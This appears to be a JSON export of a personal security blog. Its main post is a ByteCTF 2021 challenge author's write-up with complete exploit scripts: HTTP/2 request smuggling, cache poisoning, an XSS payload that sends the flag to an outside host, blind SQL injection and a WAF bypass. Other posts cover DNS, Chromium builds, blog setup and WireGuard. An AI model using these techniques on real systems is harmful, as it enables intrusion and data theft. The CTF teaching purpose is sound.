{"pages":[{"title":"","text":"关于我邮箱i#kur4ge.com 公众号 QQ","link":"/about/index.html"}],"posts":[{"title":"A-ginx 出题思路与题解","text":"在本次ByteCTF的初赛和决赛中，A-ginx都是比较少解出的题目（是我脑洞太大了吗？感觉不难呀） 这里我来谈谈我出A-ginx的思路。 一道题目，需要有若干个漏洞结合而成。我认为一个好的题目，不能随意的把各个漏洞点强制的嵌套起来，应该是符合逻辑，有所取舍的。 检查手牌那么，就来整理一下，我出题时手上拥有的漏洞点。 1. HTTP/2有些CTFer不喜欢升级手头的工具，总认为v1.7(最早发布于2016年)的Burp Suite才是经典。但是随着Burp不断更新迭代，老版本早因各种原因需要退出历史。比如老版本使用旧的Chromium，随时可能被日; 老版本Burp Suite 就不支持HTTP/2 等等 所以，本题的主体目标就决定为：一定要使用HTTP/2，强制使用老版本的CTFer升级Burp Suite。 当然出题不能无缘无故来使用HTTP/2，一定要有什么漏洞点才能加到题目中。通过研读HTTP/2的RFC文档，发现协议中并没有可以造成漏洞的问题，但协议没有，使用协议的上下游有没有呢？这篇文章给了我启发HTTP/2: The Sequel is Always Worse，虽然HTTP/2协议没有问题，但是在转化为HTTP/1.1会产生一些安全风险。 目前业界也较多采用使用支持HTTP/2的反代服务（如Nginx）来做前端的负载均衡，后面通过HTTP/1.1进行反向代理到真正的业务服务中。 2. 架构带来的风险所以整道题目的架构也浮现了：前端(反向代理) –&gt; 后端(业务逻辑) 那么 这种架构能带来什么安全问题呢? a. 请求走私 b. WAF绕过 c. 真实IP欺骗 d. 缓存攻击 3. GORM Where Key注入在旧版本中，GORM对于列名的未过滤反引号，可以造成逃逸，从而导致注入。 4. 简简单单来个XSS前端使是 Asoul-ICU小作文库 修改而来，原生代码中即存在dangerouslySetInnerHTML的使用，所以简单来说就是一个XSS。 整理手牌这些漏洞点本来是打算出在一道题中，但是发现点太多，最终拆成两道题。（桀桀，牌太多了） 初赛：请求走私 + 缓存攻击 + XSS 决赛：请求走私 + GORM注入 + 绕过WAF + 真实IP欺骗 这也是题目描述This is similar to a-ginx, but not very similar!的意义。 题目源码与环境题目的源码和环境现已全部开源，欢迎大家指教～ A-ginx 源码与环境 A-ginx2 源码与环境 解题思路和EXP初赛提供了环境，二进制程序，数据库结构。这大部分都和A-ginx2是相似的。 通用的设定Trace-Id包括现实很多地方都会存在类似于Trace-Id 的东西，它们只有一个目的，追踪请求的流转。在本题中，你可以通过Trace-Id 来判断这个请求是否到达到backend。 A-ginx2021 ByteCTF 初赛部分题目官方Writeup XSS既然提供了bot,那必然有XSS。不管通过那些途径，你可以找到两个XSS点 POST型XSS点 /v/articles/preview 展示article中的 htmlContent 是另一个XSS点 但是这两个点都不能独立的完成XSS，一个是POST型无法触发，另一个因为输入中有HTMLSanitize来进行过滤。 缓存服务观察各个API，你会发现在/static/ 下的请求，会进行缓存，并出现cache-key。这个请求头没有Trace-Id，也表示它是直接的被缓存在了A-ginx端中。 CRLF注入 400 Bad Request 携带Trace-Id 说明该请求为后端返回的。 500 Internal Server Error 未携带Trace-Id ，说明这个500是A-ginx出错造成的。根本原因是因为错误的请求包，导致后端断开了和前端的TCP请求，第二次访问的时候连接已经断开，导致500。 确认基本攻击思路这样我们就大致确定了攻击思路，通过CRLF注入把带有XSS payload的JSON写入A-ginx的/static/下的cache中。之后通过目录穿越，让/v/articles/uuid 转变为获取 /static/kur4ge1337.json来触发XSS。 写入恶意json1234567891011121314151617181920212223242526import httpximport uuidfrom urllib import parseDOMAIN = '127.0.0.1:20443'id = str(uuid.uuid4())payload1 = parse.quote(f''' HTTP/1.1Host: {DOMAIN}Connection: Keep-AlivePOST /v/articles/preview HTTP/1.1Host: {DOMAIN}Content-Type: application/x-www-form-urlencodedContent-Length: 418Connection: Keep-Alivetitle=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d''')with httpx.Client(http2=True, verify=False) as client: r = client.get(f'https://{DOMAIN}/v/' + payload1) print(r.text, r.headers.raw) r = client.get(f'https://{DOMAIN}/static/Kur4ge1337.json') print(r.text, r.headers.raw) print(f'https://{DOMAIN}/static/Kur4ge1337.json') print(r.text, r.headers.raw) 通过上面的Payload，我们可以写入任意数据到/static/下，但是新的问题出现了。 Flag的获取/flag要求管理员凭据，但是我们的管理员凭据只会在请求 /v/articles/uuid 时发送，那么，即使我们获得了XSS，也没有办法获得管理员凭据（非预期的方案不算…） 这里就要提一个点，fetch 会自动跟随302跳转。而带有../的路径又会触发302跳转。那么有没办法通过CRLF注入，把管理员凭证的利用点向后移动呢？ 当然可以，构造Payload 1..%25252f..%25252fstatic%252fKur4ge1337.json%2520HTTP%252f1.1%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%2520%252fflag Admin Location跳转后，会提取/#/articles/ 后的内容，向Aginx发送请求 123GET /v/articles/..%25252f..%25252fstatic%252fKur4ge1337.json%2520HTTP%252f1.1%250aHost:%2520localhost%250aConnection:%2520Keep-Alive%250a%250aGET%2520%252fflag HTTP/2.0Authoration：Bearer ...... Aginx 接收到请求，转发给web 请求如下， 1234567GET /v/articles/..%2f..%2fstatic/Kur4ge1337.json HTTP/1.1Host: localhostConnection: Keep-AliveGET /flag HTTP/1.1Authoration：Bearer ...... web 发现存在..%2f 返回301跳转，这里也走私了一个/flag (5行之后)请求，并且携带了Admin的凭证 12HTTP/1.1 301Location: /static/Kur4ge1337.json fetch发现存在301跳转，会自动跟随Location 发起第二轮请求。 123GET /static/Kur4ge1337.json HTTP/2.0Authoration：Bearer ...... 这个请求已经被Cache，就在Aginx端直接进行了拦截返回，即这个请求是不会发送到Web 即不会获取到走私的/flag 可以在页面中成功触发XSS，通过onerror来发起/flag 请求，来读取到之前走私的/flag。 问题解决~ EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import randomimport stringfrom pwn import *from hashlib import sha256import httpximport uuidfrom urllib import parseDOMAIN = '127.0.0.1:20443'id = str(uuid.uuid4())payload1 = parse.quote(f''' HTTP/1.1Host: {DOMAIN}Connection: Keep-AlivePOST /v/articles/preview HTTP/1.1Host: {DOMAIN}Content-Type: application/x-www-form-urlencodedContent-Length: 418Connection: Keep-Alivetitle=%7b%22data%22%3a%7b%22_id%22%3a%22%22%2c%22title%22%3a%22Kur4ge1337%22%2c%22author%22%3a%22Kur4ge1337%22%2c%22htmlContent%22%3a%22%3cimg+src%3d%2f%2fflag+onerror%3d%27fetch%28%60%2fflag%60%29.then%28r%3d%3er.text%28%29%29.then%28%28c%29%3d%3e%7bfetch%28%60%2f%2fa.bcd.ef%3a12345%2f%60%2bc%29%7d%29%27%3e%22%2c%22submissionTime%22%3a1633621705%2c%22tags%22%3a%22%22%7d%2c%22status%22%3a0%2c+%22&amp;content=%22%3a0%7d''')with httpx.Client(http2=True, verify=False) as client: # data = {'title': 'test', 'content': '&lt;p&gt;&lt;/p&gt;'} r = client.get(f'https://{DOMAIN}/v/' + payload1) print(r.text, r.headers.raw) r = client.get(f'https://{DOMAIN}/static/Kur4ge1337.json') print(r.text, r.headers.raw) print(f'https://{DOMAIN}/static/Kur4ge1337.json') print(r.text, r.headers.raw)def encodeURI(s): r = '' for c in s: if c in '''\\r\\n&quot;'%&amp;/ ''': r += '%{:0&gt;2x}'.format(ord(c)) else: r += c return rpayload2 = encodeURI(encodeURI(f'''..%2f..%2fstatic/Kur4ge1337.json HTTP/1.1Host: localhostConnection: Keep-AliveGET /flag'''.strip()))print(payload2)io = remote('127.0.0.1', 9000)context.log_level = 'debug'io.recvuntil(b'+')suffix = io.recvuntil(b')')[:-1]io.recvuntil(b'== ')hash = io.recvline()[:-1].decode()assert(len(suffix) == 16 and len(hash) == 64)def solve_pow(suffix, hash): chars = string.digits + string.ascii_letters while True: for a in chars: for b in chars: for c in chars: for d in chars: xxxx = f'{a}{b}{c}{d}' if sha256(xxxx.encode() + suffix).hexdigest() == hash: return xxxxio.sendline(solve_pow(suffix, hash))io.recvuntil(b'\\n')io.sendline(payload2)io.interactive() A-ginx2SQLi要获取管理员的密码，唯一可能就是注入了，其实没什么数据库交互点，可以看到有个query参数很奇怪，里面给的是json的k-v的形式，如果有写过gorm，那么你一定知道，GORM中where可以传入*map[string]interface{} ，其中key可控的情况就会造成SQLi 通过简单的尝试，可以获取到SQLi。 以上两个payload可以简单的确认，这里存在注入。 但是，存在对参数的WAF，需要如何绕过呢？是的。请求走私。 绕WAF &amp; 获取密码代码中只对参数进行检测，所以，只要走私到body，就可以绕过这个WAF啦！ 123456789101112131415161718192021222324252627282930313233343536373839import httpxfrom urllib import parseimport jsonDOMAIN = '127.0.0.1:30443'Authorization = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDAwMDEyMjMsInVzZXJuYW1lIjoia3VyNGdlIn0.Ml09NIlcP5dmiYM0rF09jbvYS3EiT7_EPUgz1Ue4tu0'headers = { 'Content-Length' : '0'}def check(payload): query = parse.quote(json.dumps({f&quot;title` OR (SELECT 1 FROM users WHERE username='admin' AND {payload}) OR `title&quot;:&quot;n0t_Exsit&quot;})) data = f'''GET /v/articles?pageNum=0&amp;pageSize=36&amp;query={query} HTTP/1.1Host: localhostConnection: Keep-AliveAuthorization: {Authorization}''' with httpx.Client(http2=True, verify=False) as client: r = client.request(&quot;GET&quot;, f'https://{DOMAIN}/v/', headers=headers, data=data) r = client.request(&quot;GET&quot;, f'https://{DOMAIN}/v/') print(r.text) obj = json.loads(r.text) return len(obj['articles']) != 0base_sql = 'ASCII(SUBSTR(password,{},1))&gt;{}'password = ''for i in range(1, 29): Min = 0x10 Max = 128 while abs(Max - Min) &gt; 1: mid = (Max+Min) // 2 payload = base_sql.format(i, mid) if check(payload): Min = mid else: Max = mid password += chr(Max) print(password) 写出布尔注的脚本，简简单单可以跑到密码Visit_/flag_to_get_the_flag! 但是，/flag 是需要内网ip才能访问。本题没有ssrf，没有xss bot。考虑常见的XFF Payload发现无效，只能来获取真正的XFF头。 获取IP Header来获取返回头，需要一个能够返回请求中Query的API。/v/articles/preview 这个API 就可以完成这个能力。 1234567891011121314151617181920212223import httpxfrom urllib import parseimport jsonDOMAIN = '127.0.0.1:30443'def get_header(): data = 'title=1&amp;content=' headers = { 'Content-Type': 'application/x-www-form-urlencoded', 'Connection' : 'keep-alive', 'Content-Length' : str(len(data) + 300), } first = '''GET /v/ HTTP/1.1Host: localhostConnection: Keep-Alive''' with httpx.Client(http2=True, verify=False) as client: r = client.request(&quot;GET&quot;, f'https://{DOMAIN}/v/', headers={'Content-Length': '0'}, data=first) r = client.request(&quot;POST&quot;, f'https://{DOMAIN}/v/articles/preview', headers=headers, data=data) r = client.request(&quot;POST&quot;, f'https://{DOMAIN}/v/', data='a'*400) print(r.text)get_header() 拿到Client获取信任IP的header 为 X-Sup3r-DiAnA-Re4l-Ip Get flag12345678910111213141516171819202122232425262728import httpxfrom urllib import parseimport jsonDOMAIN = '127.0.0.1:30443'def login(username, password): with httpx.Client(http2=True, verify=False) as client: data = {&quot;username&quot;: username, &quot;password&quot;: password} r = client.post(f'https://{DOMAIN}/v/login', json=data) return json.loads(r.text)['token']def get_flag(token, header): data = f'''GET /flag HTTP/1.1Host: localhost{header}: 172.16.0.1:23333Authorization: Bearer {token}''' with httpx.Client(http2=True, verify=False) as client: r = client.request(&quot;GET&quot;, f'https://{DOMAIN}/v/', headers={'Content-Length': '0'}, data=data) r = client.request(&quot;GET&quot;, f'https://{DOMAIN}/flag') print(r.text) return json.loads(r.text)['flag']token = login('admin', 'Visit_/flag_to_get_the_flag!')print(token)flag = get_flag(token, 'X-Sup3r-DiAnA-Re4l-Ip')print(flag) 为了出题而出题/偷懒的地方虽然说了那么多命题要义，但最终还是有些问题，不得不用trick来解决。 “迫真”的缓存cacheByteCTF2021/A-ginx/a-ginx/cmd/server/main.go#L42-L55 按照正常逻辑应该不需要这种诡异的判断，但是还是考虑到避免搅屎，加上了这段判断。 backend使用中间件来完成../跳转../导致的目录穿越其实是一个很经典的问题，可以看到 golang.org/x/net/http2 会自动的进行重定向，而 github.com/gin-gonic/gin 却不能。 ByteCTF2021/A-ginx2/backend/internal/handler/middleware/uri_trim.go#L13-L33 为了满足跳转造成的XSS，只能手动写一个中间件了～ 修改源码来允许非法Content-LengthByteCTF2021/A-ginx2/Dockerfile_aginx#L16 A-ginx2 中导致请求走势的注入点为Content-Length，但事实上使用golang.org/x/net/http2构建的HTTP/2服务会针对Content- Length错误抛出一个异常。并且清空body中的数据。所以为了题目的漏洞能够正确的触发，所以只能进行小小的修改了：） WAF问题WAF就随便写了一个基于关键词WAF，是偷懒了（ 具体的关键词是取自MySQL 8.0 docs中的所有keywords，剔除了部分单词，例如or（author），让逻辑可以正确运行。而且，这个waf其实可以用 \\u直接绕过（该死的log4j，让我没时间修这个） ，但是似乎，也没人用这个方案绕waf？ 最后希望大家能从这两题中有所收获～","link":"/2021/12/A-ginx-idea-and-writeup/"},{"title":"为什么我的百度访问这么慢？？？","text":"启由于国内DNS对于某些域名会进行劫持，所以前段时间我把DNS配置到8.8.8.8。 之后我的网络百度等一些国内站点就变得非常的慢。 Pi-Hole之前以为是DNS设为谷歌DNS ，由于网络距离，导致DNS请求非常慢。所以拿了一个树莓派，使用Pi-hole自建了一个DNS服务器，希望使用缓存来增加体验。 但是没什么用，访问百度依然很慢，因为后面事情多了，也忍下去了。 发现问题某次我查询百度IP的时候，惊奇的发现，这个IP居然是香港的??? 到这下明白了，使用Google DNS解析百度都会认为海外用户访问，从而解析到香港服务器，导致国内访问巨慢。 那既然发现问题，该怎么解决呢？ chinadns-ngchinadns-ng，它可以通过域名黑/白名单来自定义切换解析DNS，让国内域名通过国内DNS，国外域名通过国外DNS。 编译1234git clone https://github.com/zfl9/chinadns-ng.gitcd chinadns-ngmake 我的启动参数123#!/bin/bashnohup ./chinadns-ng -l 15353 -c &quot;223.5.5.5#53,114.114.114.114#53&quot; -t &quot;8.8.8.8#53,1.1.1.1#53&quot; -m chnlist.txt -g gfwlist.txt -4 chnroute.ipset -6 chnroute6.ipset -p 2 &amp; 定期重启脚本123456789#!/bin/bashpid=$(ps -fu root | grep chinadns-ng | grep -v grep | awk -F' ' '{print $2}')echo &quot;restart, pid = $pid&quot;if [ -n &quot;$pid&quot; ]; then kill -9 $pid sleep 5finohup ./chinadns-ng -l 15353 -c &quot;223.5.5.5#53,114.114.114.114#53&quot; -t &quot;8.8.8.8#53,1.1.1.1#53&quot; -m chnlist.txt -g gfwlist.txt -4 chnroute.ipset -6 chnroute6.ipset -p 2 &amp; 保存为sh脚本，最后加入crontab，即可定时重启 定期数据更新123456789#!/bin/bash# 走代理以免更新失败export http_proxy=export https_proxy=./update-chnlist.sh./update-chnroute.sh./update-chnroute6.sh./update-gfwlist.sh 保存为sh脚本，最后加入crontab，即可定时更新 配置Pi-Hole由于Pi-Hole提供了广告封禁，DNS缓存的功能。所以我还是继续选择使用Pi-hole，修改它的上游DNS服务为 127.0.0.1#15353 其他配置均不需要修改。 终最后的解析终于正常了，再访问国内站点终于体验飞一样速度了~","link":"/2021/11/Why-is-Baidu-so-slow/"},{"title":"Chromium 编译的那些坑","text":"启尝试接触一下Chromium，第一步一定是编译一版属于自己的Chromium。官方文档 Get the code: check out, build, and run Chromium 里面的的教程非常详细，一步一步操作就好了。 注意，大多数资源都无法国内无法访问 :D Windows 下载Windows通过设置HTTP_PROXY效果并不好，我使用了全局VPN（某海豹）来进行数据的下载 Windows 10 SDK下载过程比较稳定，没遇到什么问题在初始化时候遇到缺少Windows 10 SDK 报错如下 12345678910111213$ gn gen out/DefaultTraceback (most recent call last): File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 573, in &lt;module&gt; sys.exit(main()) File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 569, in main return commands[sys.argv[1]](*sys.argv[2:]) File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 400, in CopyDlls _CopyDebugger(target_dir, target_cpu) File &quot;D:/Code/chromium/src/build/vs_toolchain.py&quot;, line 433, in _CopyDebugger raise Exception('%s not found in &quot;%s&quot;\\r\\nYou must install'Exception: dbghelp.dll not found in &quot;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbghelp.dll&quot;You must installWindows 10 SDK version 10.0.19041.0 including the &quot;Debugging Tools for Windows&quot; feature.ERROR at //build/toolchain/win/BUILD.gn:55:3: Script returned non-zero exit code. 那么，下载 windows-sdk 并安装就可以解决 参考编译时间I9-9900KF 64G，大约需要3小时 Linux执行人教程中需要执行 1./build/install-build-deps.sh 记得使用sudo执行，而不是切换到root执行。 内存盘内存盘很好，但是官方提供命令好像有问题？ 1mount -t tmpfs -o size=20G,nr_inodes=40k,mode=1777 tmpfs /path/to/out 上面是官方提供的命令，但是我在编译进程中，总是会出现文件不可写的错误，最终改成 1mount -t tmpfs -o size=20G tmpfs /path/to/out 问题解决 无法运行虽然编译很快，但是运行就挂了，目前在Debug中… 参考编译时间Intel Xeon Platinum 8260 * 2， 768GB，大约需要30分钟。 MacOSMacOS我编译了两次，一次是临时领用（重置过）的一台MBP，一次是我日常使用的MBP 在领用的电脑按照教程，是毫无问题。但是在本机出现一个坑。 默认Python不同 初始化是需要使用Mac原生Python，使用下面命令临时修改即可 1export PATH=&quot;/usr/bin:$PATH&quot; 参考编译时间MacBookPro 2019 I7 16″ 32GB领用机大约需要3小时，日常机大约4小时。 总结官方提供的教程是非常详细的，大多数最大的坑可能是网络问题。多搜索，多尝试一定可以解决的~","link":"/2021/11/chromium-build/"},{"title":"Hello World","text":"不知不觉打工也一年多了， 日常的重复工作让人变得咸鱼。 但是！ 搞安全怎么能停止对新姿势的学习呢？ Keep learning，keep sharing！","link":"/2021/10/hello-world/"},{"title":"我的博客配置","text":"启果然，第一篇肯定要讲一讲自己是如何配置的我的博客。 从 WordPress 研究到 ZBlog，最后还是选了老朋友 Hexo （毕竟可以GitHub Page） 主题选择主题想着比较清爽，看的舒服就好了。这里选择了 hexo-theme-icarus。 基础配置由于需要自动化部署，配置、文章、资源数据都需要在存放在GitHub仓库中。 一共使用四个仓库,分别存放配置、样式、文章/资源数据，这些通过git submodule将他们关联起来，还需要一个仓库专门用来存放GitHub Page的数据。 1234git initgit remote add origin https://github.com/kur4ge/blog.gitgit submodule add https://github.com/kur4ge/blog-posts source/_postsgit submodule add https://github.com/kur4ge/hexo-theme-icarus.git themes/icarus 为了保证每次部署的统一，我fork一份主题（当然也可以使用npm install的方案） 因为配置中存了accesskey 所以权限是设为私有了：） 优化自动部署 x WorkflowWorkflow 是 GitHub 推出的自动化流，可以简单的理解能在收到push，pull 等请求后会自动执行一段或多段代码（类似执行docker的build） 通过简单的配置，就可以自动化的在云端生成并部署博客，这是我的配置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# This is a basic workflow to help you get started with Actionsname: CI# Controls when the workflow will runon: # Triggers the workflow on push or pull request events but only for the main branch push: branches: [ main ] # 只用 main 被 push 才触发 # Allows you to run this workflow manually from the Actions tab workflow_dispatch:env: NODE_VERSION: '14.18.1' # set this to the node version to use# A workflow run is made up of one or more jobs that can run sequentially or in paralleljobs: # This workflow contains a single job called &quot;build&quot; build: # The type of runner that the job will run on runs-on: ubuntu-latest # 初始镜像 FROM ubuntu:latest (bushi) # Steps represent a sequence of tasks that will be executed as part of the job steps: - name: Use Node.js ${{ env.NODE_VERSION }} # 构建初始化 node 环境 uses: actions/setup-node@v2 with: node-version: ${{ env.NODE_VERSION }} - name: Clone blog # Clone blog 最新的数据，并且拉取 submodules 数据 uses: actions/checkout@v2 with: token: ${{ secrets.PAT }} repository: kur4ge/blog submodules: true fetch-depth: 1 - uses: actions/cache@v2 # cache node_modules 如果 package-lock.json 没变的话可以大大加速 with: path: node_modules key: node_modules-${{ hashFiles('**/package-lock.json') }} - name: npm install # 安装依赖 run: | npm i hexo-cli &amp;&amp; npm i - name: Generate and deploy # 生成并部署 env: GITHUB_TOKEN: ${{ secrets.PAT }} run: | ./node_modules/.bin/hexo g -d 其中需要配置 PAT 在 Personal access tokens 生成一个，并配置到 settings/secrets/actions 即可。 整体耗时如下，可以看出使用了Cache服务，整体能在一分钟内完成部署，效率还是很快的~ 加速，还是加速！服务是部署在GitHub Page上的，美中不足是带宽比较小。为了阅读体验使用CDN来加速资源加载。 Cloudflare本来打算使用阿里云DNS可以控制内外域名解析，使用Gitee作为国内节点（可惜 Gitee 要收费），Github作为国外节点。最后决定使用 Cloudflare 做全站的加速。 阿里云OSS既然要用CDN，那就要把所有的外部资源统统整上CDN。（反正流量也不大，花不了多少钱。这里使用了 hexo-deployer-cos-cdn 进行魔改，可以自定义跳过部分文件，让CDN仅作为附件的纯净CDN。 相应使用CDN也需要调整图片路径，这里使用了魔改后的 hexo-asset-path ，与自己编写的 hexo-dom-modify 来修改js、css的地址。 简洁因为图片资源使用了CDN，所以不想图片数据也上传到Github Page中，所以我写了一个部署中间件，hexo-delete-sth，可以在部署的流程中，指定删除文件。避免空目录和你不想要的文件进入第二次部署上传。 所以，这是我的最后部署配置 123456789101112131415161718192021222324252627282930313233343536373839404142deploy: - type: delete-sth deleteFiles: # 这两个文件是 icarus 主题带的 - img/logo.svg - img/razor-*-black.svg - type: cos-cdn # 上传CDN cloud: aliyun cdnUrl: https://****.aliyuncs.com bucket: **** region: **** cdnEnable: false secretId: **** secretKey: **** disallowFiles: - *.html - atom.xml - content.json - manifest.json - sitemap.xml - CNAME - robots.txt - type: delete-sth # 删除已经上传的图片资源 deleteFiles: - 20*.png - 20*.jpg - 20*.jpg - 20*.gif - 20*.ico - 20*.svg - about/*.png - css/* - js/* deleteEmptyFolder: true - type: git # GitHub Page 部署 repo: url: https://github.com/**** branch: page token: $GITHUB_TOKEN branch: page token: $GITHUB_TOKEN name: **** email: ****@***.*** 公式SSR可能很少写公式，但是这功能我觉得很重要。hexo-filter-mathjax-ssr。它可以在渲染时把公式转为svg格式，这样就不需要前端加载mathjax组件；也不会让读者看到转瞬即逝的丑陋代码，并且也能在Typora中带来统一的体验。给个渲染例子： 行内 x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a} 的渲染！ A= \\begin{bmatrix} {a_{11}}&amp;{a_{12}}&amp;{\\cdots}&amp;{a_{1n}}\\\\ {a_{21}}&amp;{a_{22}}&amp;{\\cdots}&amp;{a_{2n}}\\\\ {\\vdots}&amp;{\\vdots}&amp;{\\ddots}&amp;{\\vdots}\\\\ {a_{m1}}&amp;{a_{m2}}&amp;{\\cdots}&amp;{a_{mn}}\\\\ \\end{bmatrix} 独立居中！ Loading如果你网速比较慢，你可以看到一直可爱的小水母（其实是乌贼），他的原图如下，但是蓝色加载动画在纯白背景中显得非常的突兀（这不得魔改一把？） 通过简单的PS技巧修改而成（手有PS走遍天下都不怕）。 也将他的大小压到了 28KB 写作最后来说说协作体验，能坚持博客，一定要写的舒服！ 虽然Markdown只要用个记事本就可以完成撰写，但是图片等附件还是需要你慢慢的拖和改。经过摸索，我使用Typora 可以在普通模式中像飞书文档一样编写，也可以通过CTRL + / 进入源码模式进行精细的编辑（能双栏同时滚动就更好了）。 并没有做过多的配置，就配置了一项 这样就可以使用剪贴板来粘贴图片，再配合上Hexo的post_asset_folder: true 既能在Typora中正常浏览，渲染也不会出现问题。 终第一篇比较正式的博文，拖了好久终于写完了，感谢阅读~ Keep learning，keep sharing！","link":"/2021/10/my-blog/"},{"title":"WireGuard 简易上手","text":"其实，你既然搜到这个文章，也说明你已经对WireGuard有所了解。简简单单介绍一下，WireGuard 是一个简单部署+快速的VPN，它的目标是比 IPsec 更快、更简单、更精简和更有用，并比 OpenVPN 性能要高得多。 WireGuard 能适用于许多不同的环境。现在它是跨平台的（Windows、macOS、BSD、iOS、Android）VPN。 部署目标既然是简易上手，当然部署一套内网是最容易说明的。我们的目标是通过部署实现，让三台异地主机能在同一个内网中互相访问！ 安装WireGuard官方安装文档 WireGuard Install 1234567891011# Ubuntu 安装方式add-apt-repository ppa:wireguard/wireguardapt-get updateapt-get install linux-headers-$(uname -r)apt-get install wireguard# Debian 安装方式echo &quot;deb http://deb.debian.org/debian/ unstable main&quot; &gt; /etc/apt/sources.list.d/unstable.listapt-get updateapt-get install linux-headers-$(uname -r)apt-get install wireguard Windows 用户直接下载客户端安装；macOS 用户可以登入非国区账号进行下载 配置Server端Server 端建议在 Linux 部署，Windows 网络转发（内网通信）坑很大。 1. 启用IP转发（这样内网用户才能互相通信）1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 如果想永久保留配置，可以修改/etc/sysctl.conf文件 1将 net.ipv4.ip_forward=0 改为 net.ipv4.ip_forward=1 2. 生成公私钥1wg genkey | tee privatekey | wg pubkey &gt; publickey 操作之后，你的目录就会有两个文件。注意保护好私钥哦~ 3. 配置文件新建/etc/wireguard/wg0.conf并贴入以下内容。记得要按需修改。 1234567891011121314151617181920212223242526272829[Interface]# 服务器私钥PrivateKey = server_private_key# 绑定地址Address = 100.64.0.1/24# 是否保存配置, 可以在运行中通过命令行添加新客户端, 并保存到此配置SaveConfig = true# 自动脚本, 这里就要把 ens3 替换成之前记下的外网网卡名称 , wg0 是等下创建的虚拟网卡名称# 配置防火墙规则 让客户端可以可以通过ens3网卡上网，如果不想client通过server上网可以注释掉# %i 是 表示当前INTERFACE的配置名 # 一共可以设定 PreUp，PostUp，PreDown，PostDown 4个事件PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE; ip6tables -A FORWARD -i %i -j ACCEPT; ip6tables -A FORWARD -o %i -j ACCEPT; ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE# 关闭动作, 操作同上PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE; ip6tables -D FORWARD -i %i -j ACCEPT; ip6tables -D FORWARD -o %i -j ACCEPT; ip6tables -t nat -D POSTROUTING -o eth0 -j MASQUERADE# 监听端口ListenPort = 65535# 客户端配置[Peer]# 客户端公钥PublicKey = client1_public_key# 允许客户端获取的地址AllowedIPs = 100.64.0.2/32 4. 启动服务1wg-quick up wg0 运行之后，你就能看到 ListenPort 对应的UDP端口已经打开。如果启动失败，出现RTNETLINK answers: Operation not supported 尝试重启主机或者升级系统。 配置客户端按照服务端的方式生成客户端的共私钥 123456789[Interface] PrivateKey = client1_privete_key Address = 100.64.0.2/32 DNS = 8.8.8.8[Peer] PublicKey = server_public_key AllowedIPs = 100.64.0.0/24 Endpoint = server_ip:port PersistentKeepalive = 25 Address 要和 服务端配置相同 /32 代表固定IPDNS 会修改全局DNS配置。如果没有特殊要求可以不填。（8.8.8.8在国内还是慢的，详情见 为什么我的百度访问这么慢？？？）AllowedIPs 允许代理的网段，有几个配置可以自行使用 12AllowedIPs = 100.64.0.0/24 # 仅内网访问AllowedIPs = 0.0.0.0/24 # 全网访问 需要服务端开启网络转发 常用命令速查启/停12wg-quick up wg0wg-quick down wg0 自启动服务1systemctl enable wg-quick@wg0 增/删用户直接在conf增加一个[peer]就可以，或者使用 1234wg set wg0 peer client_public_key allowed-ips 100.64.0.2/32wg-quick save wg0wg set wg0 peer client_public_key removewg-quick save wg0 参考WireGuard配置 Debian10 Wireguard VPN","link":"/2022/02/wireguard-tutorial/"},{"title":"我的自动化番剧工作流","text":"啊B最近番剧越来越不能看了，加上鼓捣影音库已经上了Plex Pass，是时候鼓捣自动下番了！ Transmission使用 Transmission 进行 BT下载 无脑 Docker 1234567891011121314151617181920212223242526---version: &quot;2.1&quot;services: transmission: image: lscr.io/linuxserver/transmission:latest container_name: transmission environment: - PUID=1001 - PGID=1001 - TZ=Asia/Shanghai - TRANSMISSION_WEB_HOME= #optional - USER= #optional - PASS= #optional - WHITELIST= #optional - PEERPORT= #optional - HOST_WHITELIST= #optional volumes: - /path/to/config/folder:/config - /path/to/downloads/folder:/downloads - /path/to/watch/folder:/watch ports: - 9091:9091 - 51413:51413 - 51413:51413/udp# network_mode: host restart: unless-stopped 自动化下载通过 FlexGet 定期向 acg.rip 爬取rss，解析想要的字幕组，推送到 Transmission 自动下载。 无脑安装命令 1pip install flexget config.yaml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126templates: tr: transmission: host: localhost port: your_port username: your_username password: your_password # add_paused: yes # 添加后不自动下载variables: save_root: /mnt/Media/WEB-DL # 保存的位置 # 最终会保存到 /mnt/Media/WEB-DL/字幕组名称/番剧名称/S??/ 下tasks: acg.rip: rss: https://acg.rip/.xml?term= seen: fields: - url manipulate: - full: from: title # 保存一份拷贝 - full: from: full replace: regexp: '\\[(Lilith-Raws)] (.* / )?(.*?)( S?(\\d+))? - (\\d+) \\[([^]]+)].*?(1080|720)[pP].+' format: '\\1#0#\\3#1#\\5#2#\\6#3#\\7#4#\\8' - full: from: full replace: regexp: '【(喵萌.*?)】★.*?★\\[.*? ?/ ?([^]]+)]\\[(\\d+)]\\[(1080|720)[pP]?].*?(简).+' format: 